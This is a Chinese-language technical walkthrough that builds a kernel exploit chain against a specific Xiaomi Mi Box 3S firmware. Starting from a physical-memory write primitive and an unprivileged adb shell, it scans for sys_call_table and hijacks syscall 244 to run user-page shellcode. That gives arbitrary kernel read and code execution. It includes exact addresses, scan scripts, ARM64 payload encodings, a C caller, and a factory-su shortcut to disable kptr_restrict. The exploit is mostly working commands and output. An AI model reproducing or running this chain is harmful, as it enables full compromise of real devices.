# 在没有 root 的固件上定位 `SLOT_PHYS` 与 `KLN_ADDR`

> 适用前提：你已经能在目标上跑通 Utgard 的任意物理写原语（`gpwrite64 place 0` 返回
> `PLACEMENT OK`），但只有无特权的 `adb shell`（uid 2000）。
>
> 本文所有数字和输出都来自 **小米盒子 3S（MDZ-19-AA），build `6.8.22.145`，
> kernel `3.14.29-301259-g15fb973`**，逐条实测。

---

## 0. 结论先行

| 常量 | 值 |
|---|---|
| `SLOT_PHYS` | `1eaf7a0` |
| `KLN_ADDR` | `ffffffc00111e5a0` |

| 符号 | 虚拟地址 | 物理 |
|---|---|---|
| `sys_call_table` | `0xffffffc001eaf000` | `0x1eaf000` |
| `sys_ni_syscall` | `0xffffffc0010c359c` | |
| `memcpy` | `0xffffffc0013e0bd0` | |
| `selinux_enforcing` | `0xffffffc002094ee4` | |
| `core_pattern` | `0xffffffc001ee4088` | |
| `_text` / `_etext` | `0xffffffc001080000` / `0xffffffc001d84184` | `0x1080000` / `0x1d84184` |
| `_sdata` / `_edata` | `0xffffffc001e9a000` / `0xffffffc001fa8560` | `0x1e9a000` / `0x1fa8560` |

与 817 的差别（不能混用）：817 的表在 `0x1ee7000`、`KLN` 在 `0xffffffc00111e5d0`。

---

## 1. 先排除两条走不通的路

**离线解符号：不可行。** 四个 `boot_*.img` 的 kernel 段熵都是 `8.000`，不匹配
gzip / lz4 / xz / lzma / zstd / bzip2 任何魔数，也搜不到 `ARM\x64`、`Linux version`
—— Amlogic secure boot，没有 OEM 密钥解不开。

**读 `/proc/kallsyms`：不可行。** 无 root 时 89,246 行地址全是 `0`；`/proc/modules`
和 `/sys/module/*/sections/*` 同样被 `kptr_restrict=1` 清零（`kallsyms_show_value()`
要 `CAP_SYSLOG`，而 uid 2000 没有）。

> 顺带：如果手上恰好是没阉掉工厂 `su` 的老固件（145 就是），
> `echo id | /system/xbin/su` 直接就是 root，再
> `echo 0 > /proc/sys/kernel/kptr_restrict; echo 1 > /proc/sys/kernel/perf_event_paranoid`
> 之后 `/proc/kallsyms` 会显示真实地址（3.14 在 `kptr_restrict=0` 时走
> `kallsyms_for_perf()`）。这条路只对部分老版本成立，下面讲的是通用方法。

---

## 2. 无 root 能拿到的三样东西

```sh
adb shell cat /proc/iomem
```

```
01000000-052fffff : System RAM
  01080000-01d84183 : Kernel code
  01e9a000-023e5fff : Kernel data
  07300000-07307fff : persistent_ram
```

- **`Kernel code` / `Kernel data` 的物理边界** —— 这是后面扫描的范围来源，普通 shell 就能读。
- **`/proc/kallsyms` 的符号顺序** —— 地址虽然被清零，但顺序和名字是真的，最后对齐用得上。
- **`dmesg` 里的 `%p`** —— 3.14 没有指针哈希，`%p` 打的是原始地址（实测有
  `vinfo:ffffffc001f35a58` 这类）。但这台机器只泄漏数据指针，没有函数地址，所以**不能**直接当种子用。

结论：无 root 时**一个可执行的函数地址都拿不到**。所以不能走"先有种子再扫描"这条路。

---

## 3. 关键前提：physmap 在 EL1 可执行

这是整套方法的核心。arm64 3.14 的内核线性映射是 2MB block，实测解出来的属性是：

```
L2 block 0x0040000001e00711  ->  PXN=0 (EL1 可执行)  UXN=1  AF=1  AP=0
```

`PXN=0` 意味着：**用户页面的物理页，在内核线性映射里的那个别名是可以被 EL1 执行的。**
所以我们可以把"自己写的代码"放进一个自己拥有的页面，然后用
`0xffffffc000000000 + phys` 当地址交给内核去执行 —— 不需要任何内核符号。

一次性验证（把一条 `ret` 放进页面，看 `syscall(244)` 是否干净返回）：

```sh
P=$(/data/local/tmp/gpwrite64 place 0 | sed -n 's/.*phys=0x\([0-9a-f]*\).*/\1/p')
/data/local/tmp/gpwrite64 write $P d65f03c0          # 页首放 ret
/data/local/tmp/gpwrite64 write 1eaf7a0 ffffffc0$P   # slot 244 -> physmap 别名
/data/local/tmp/kfunc_new call 244                   # -> nr=244 ret=0x0
```

---

## 4. 用这个 canary 找 `sys_call_table`

`sys_call_table[244]` 距表首 `244*8 = 0x7a0` 字节。所以对每个候选页 `cand`：

1. 往 `cand + 0x7a0` 写 128 字节 canary（硬件固定写 128 字节）；
2. 刷缓存（`cache_thrash` 已内置在 `gpwrite64` 里，这一步不能省 —— 表项缓存行常驻，
   DMA 写下去 CPU 看不到）；
3. `syscall(244)`，看返回值。

命中的判据不能是"返回值不是 -ENOSYS"，因为 payload 可以主动返回一个魔数。用
`movz x0,#0x1234 ; ret` 最稳，命中时返回 `0x1234`：

```sh
# 0xd2824680 = movz x0,#0x1234   0xd65f03c0 = ret
/data/local/tmp/gpwrite64 write $P d65f03c0d2824680
```

扫描（页粒度，从 `Kernel data` 起始开始；Android 的 `seq` 不认十六进制，用算术循环）：

```sh
c=$((0x1e9a000))
while [ $c -le $((0x1f20000)) ]; do
  /data/local/tmp/gpwrite64 write $(printf %x $((c+0x7a0))) ffffffc0$P >/dev/null
  r=$(/data/local/tmp/kfunc_new call 244 | sed -n 's/.*ret=0x//p')
  if [ "$r" = 1234 ]; then echo "HIT $(printf %x $c)"; break; fi
  c=$((c+0x1000))
done
```

实测：从 `0x1e9a000` 起扫，命中在 `0x1eaf000`（距 `.data` 起始 `+0x15000`，第 22 页），
于是 `SLOT_PHYS = 0x1eaf7a0`。

**为什么是页粒度**：两个已知固件里 `sys_call_table` 都是页对齐的（145 是 `0x1eaf000`，
817 是 `0x1ee7000`）。按 `0x1000` 走，每个未命中的候选只污染 `cand+0x7a0` 处的 128 字节；
按 8 字节走会多出 512 倍的写入量，必然把内核打崩。

**为什么从 `Kernel data` 起始扫**：表在 `.data` 前部（145 偏移 `+0x15000`，817 偏移
`+0x4D000`），一般几十页内就命中，不用扫整个 4.8MB。

> ⚠️ **扫描前必须先把 slot 244 还原成 `sys_ni_syscall`**，否则上一轮实验留在表项里的
> canary 会让第一次探测就"命中"，得到一个假地址。我第一次就踩了这个坑：
>
> ```sh
> /data/local/tmp/gpwrite64 write 1eaf7a0 ffffffc0010c359c   # 145 的 sys_ni_syscall
> /data/local/tmp/kfunc_new call 244                          # 应重新返回 -ENOSYS
> ```

---

## 5. 从 canary 到任意内核读

页面里放不同的 payload，同一个槽位就有不同的内核能力。**注意槽位永远执行页面里的那段代码，
参数不匹配会直接把内核打崩**（详见第 8 节）。

**单字读** —— `ldr x0,[x0] ; ret`，读任意地址 8 字节：

```sh
# 0xf9400000 = ldr x0,[x0]   0xd65f03c0 = ret
/data/local/tmp/gpwrite64 write $P d65f03c0f9400000
/data/local/tmp/gpwrite64 write 1eaf7a0 ffffffc0$P
/data/local/tmp/kfunc_new call 244 0xffffffc001080000
# -> ret=0x14000010   即 _text 处的 `b` 指令
```

**批量拷贝** —— 5 条指令，`memcpy(x0=用户缓冲, x1=内核地址, x2=长度)`：

| 偏移 | 指令 | 编码 |
|---|---|---|
| +0x00 | `ldrb w3,[x1],#1` | `0x38401423` |
| +0x04 | `strb w3,[x0],#1` | `0x38001403` |
| +0x08 | `subs x2,x2,#1` | `0xf1000442` |
| +0x0c | `b.ne -3`（回到 +0） | `0x54ffffa1` |
| +0x10 | `ret` | `0xd65f03c0` |

`gpwrite64` 每次写 128 字节的同值，所以要按 **先 +0、再 +8、再 +16** 的顺序写：

```sh
/data/local/tmp/gpwrite64 write $P         3800140338401423
/data/local/tmp/gpwrite64 write $(printf %x $((0x$P+8)))  54ffffa1f1000442
/data/local/tmp/gpwrite64 write $(printf %x $((0x$P+16))) d65f03c0
```

调用器要能传 3 个寄存器（`kfunc_new call` 只传 1 个），一个十几行的 `kread` 就够：

```c
unsigned char *buf = mmap(0, 0x4000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
memset(buf, 0, len);                     /* 先把页触碰进来，否则内核写会缺页 */
syscall(244, (unsigned long)buf, addr, (unsigned long)len);
```

实测 32 字节：

```
$ kread 0xffffffc001080000 32
1000001400000000000008010000000000603601000000000000000000000000
```

第一行 16 字节和单字读出来的 `0x14000010 / 0x1080000` 完全对得上。

---

## 6. 解析 `KLN_ADDR`

到这一步你已经能任意读写内核了，`KLN_ADDR` 有两条路：

**路线 A（推荐，根本不需要 `kallsyms_lookup_name`）**：把页面换成自己的 payload 直接干活。
原链路用 `KLN` 只是为了"拿到任意读写"，而 canary 本身已经是任意代码执行 + 任意读写了。
`run.sh` 可以整段删掉 stage 0/1/2。

**路线 B（要保住原来的 `KLN` 链路）**：把内核镜像从 RAM 拖下来，离线解析 kallsyms。

1. 用第 5 节的批量拷贝，从 `0x1080000` 起把 `Kernel code` + `Kernel data` 拉到本地
   （一次 0x10000～0x100000 字节，几十次调用即可，线性映射下物理地址 = 虚拟地址 - `0xffffffc000000000`）；
2. 在 dump 里找 kallsyms 的**地址数组**：一段长度约等于符号数（145 是 89,246）、
   单调递增、值都落在 `[0xffffffc001080000, 0xffffffc0023e5fff]` 的 8 字节数组；
3. 拿 `/proc/kallsyms` 的**顺序**（无 root 也能读）去对齐：第 *i* 行的名字对应数组第 *i* 项；
4. `kallsyms_lookup_name` 在名字列表里的下标就是它的下标，取数组对应项即可。

> 这一步等价于 `vmlinux-to-elf` 对 vmlinux 做的事，只是数据源换成了运行中的 RAM。
> 145 上我用有 root 的路子对照过，值是 `0xffffffc00111e5a0`。

---

## 7. 用已知值反向自检

拿到两个常量后，用"写表项 + 解析符号"闭环验证，别信纸面数字：

```sh
adb push src/kfunc_new /data/local/tmp/ && adb shell chmod 755 /data/local/tmp/kfunc_new
/data/local/tmp/gpwrite64 write 1eaf7a0 ffffffc00111e5a0   # slot 244 -> kallsyms_lookup_name
/data/local/tmp/kfunc_new sym memcpy
# -> memcpy = 0xffffffc0013e0bd0     与 /proc/kallsyms 里的值一致才算对
/data/local/tmp/kfunc_new sym selinux_enforcing
# -> selinux_enforcing = 0xffffffc002094ee4
```

---

## 8. 踩坑清单

1. **`panic_on_oops=1`**：内核里任何一次错误解引用都会直接重启（实测 15 秒起来，`/data` 无损）。
   `kfunc_new show/dump` 传错地址、或槽位里的 payload 参数不匹配，都会 oops。
   - 我踩过两次：一是把页表项里的**物理地址**当虚拟地址读；二是槽位里还是"拷贝" payload
     时用 `call 244 <addr>` 只传了 1 个参数，`x1=0` 让内核读地址 0。
2. **残留表项会造成假命中**：扫描前一定先把 slot 244 还原成 `sys_ni_syscall`。
3. **写原语是 128 字节定长**：想摆多打指令的 payload，只能按"从后往前"的顺序分段写。
4. **`cache_thrash` 不能省**：`sys_call_table` 的缓存行常驻，DMA 写下去 CPU 仍然读旧值，
   不冲刷就永远扫不中。
5. **必须 64 位调用**：32 位进程走的是 `.text` 里的 `compat_sys_call_table`，怎么扫都不会命中。
6. **这台机器的 `/dev/ion` mmap 是坏的**（任何映射都返回 `0x400008`），所以写原语必须用
   `gpwrite`（普通文件页 + `/proc/self/pagemap` + external 后端），不能用原版 `gpu_arb_write`。
7. **`sys_call_table` 是页对齐的**这个前提只在这两个固件上验证过；换机型先用页粒度试，
   不要直接上 8 字节步长。

---

## 9. 硬件无关性说明

第 3 节的 `PXN=0` 是这套方法唯一的硬前提。如果目标固件给线性映射加了 `PXN`（或开了
`CONFIG_STRICT_KERNEL_RWX` 之外更严的配置），canary 就会变成"一调用就 oops"，那时只能回到
"先找一个种子地址"的老办法：`dmesg` 里的函数指针、pstore 崩溃转储、串口 console，
或者干脆先拿一次 root 读 `/proc/kallsyms`。
